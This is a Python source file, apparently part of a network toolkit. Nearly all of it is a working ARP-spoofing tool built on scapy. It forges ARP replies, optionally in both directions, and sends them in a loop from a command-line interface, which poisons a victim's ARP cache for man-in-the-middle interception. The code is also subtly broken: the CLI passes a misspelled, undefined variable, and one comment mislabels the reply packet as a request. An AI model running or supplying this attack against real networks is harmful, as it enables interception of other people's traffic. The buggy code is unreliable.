import time

import click
import scapy.all as scapy

from networktoolkit import networkscan


def gen_arp_response(target_ip, spoof_ip):
    if scan_results := networkscan.scan(
        target_ip
    ):  # checks to see if the target is reachable on the network
        target = scan_results[0]
        packet = scapy.ARP(
            op=2,  # ARP response (op=1 would be ARP request). We are spoofing a request packet
            pdst=target_ip,
            hwdst=target.mac_addr,
            psrc=spoof_ip,  # ip adddress we are spoofing (pretending to be)
        )
        return packet


def arpspoof(target_ip, spoof_ip, bi_directional=False, delay=1):
    packets = []

    click.echo(f"[+] Generating ARP Response (dest={target_ip} spoofing={spoof_ip}")
    packets.append(gen_arp_response(target_ip, spoof_ip))

    if bi_directional:
        click.echo(f"[+] Generating ARP Response (dest={spoof_ip} spoofing={target_ip}")
        packets.append(gen_arp_response(spoof_ip, target_ip))

    counter = 0

    try:
        while True:
            counter += 1
            for packet in packets:
                scapy.send(packet, verbose=False)
                click.echo(
                    f"Sent ARP Response to {packet.pdst} spoofing {packet.psrc} {counter} time{'s' if counter != 1 else ''}"
                )
            time.sleep(delay)
    except KeyboardInterrupt:
        click.echo(f"Detected keyboard interrupt. Exiting...")


@click.command()
@click.argument("target_ip")
@click.argument("spoof_ip")
@click.option("-b", "--bi_directional", is_flag=True, help="Spoof in both directions")
@click.option(
    "-d",
    "--delay",
    default=1,
    help="Delay between sending each set of packets (seconds)",
)
def cli(target_ip, spoof_ip, bi_directional, delay):
    arpspoof(target_ip, spoof_ip, bi_directinal, delay)
